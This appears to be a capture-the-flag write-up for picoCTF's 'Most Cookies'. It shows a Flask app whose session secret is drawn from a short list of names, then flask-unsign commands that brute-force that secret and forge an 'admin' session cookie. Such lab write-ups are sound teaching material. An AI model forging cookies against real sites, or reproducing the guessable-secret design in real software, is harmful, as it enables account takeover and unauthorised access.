# URL
https://play.picoctf.org/practice/challenge/177
# Concept
* encoded cookies
* JWT (JSON web tokens)
* Flask cookies
# Method of solve
* this challenge lets us see the app's source code, written in Python
```
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "blank":
                        return render_template("index.html", title=title)
                else:
                        return make_response(redirect("/display"))
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/search", methods=["GET", "POST"])
def search():
        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
        else:
                message = "That doesn't appear to be a valid cookie."
                category = "danger"
                flash(message, category)
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/reset")
def reset():
        resp = make_response(redirect("/"))
        session.pop("very_auth", None)
        return resp

@app.route("/display", methods=["GET"])
def flag():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
                flash("That is a cookie! Not very special though...", "success")
                return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

if __name__ == "__main__":
        app.run()
```
* Flask apps create cookies that look similar to JWTs, but are slightly different
* this application creates cookies that are signed with a secret that is the name of one of the cookies in the list of cookies in the code
* we can use a tool, like `flask-unsign` to create a cookie with the secret value `admin`, and send it back to the app to get the flag for the challenge
```
flask-unsign --decode --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aIGZmQ.mNrs9hRTcfj4dt0NLK0Os_Auppo"
echo -n "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aIGZmQ.mNrs9hRTcfj4dt0NLK0Os_Auppo" > cookie.txt
```
* create the list of cookies by grabbing the list from the Python source code and putting in a file called `secret.txt`
* brute force the secret for the cookie with the following command:
```
flask-unsign --wordlist secrets.txt --unsign --cookie < cookie.txt
```
* use the secret we get from the brute-force and create the admin cookie with the command below
```
flask-unsign --sign --secret "fortune" --cookie "{'very_auth':'admin'}"
```
* copy the cookie and submit to the web app to get the flag
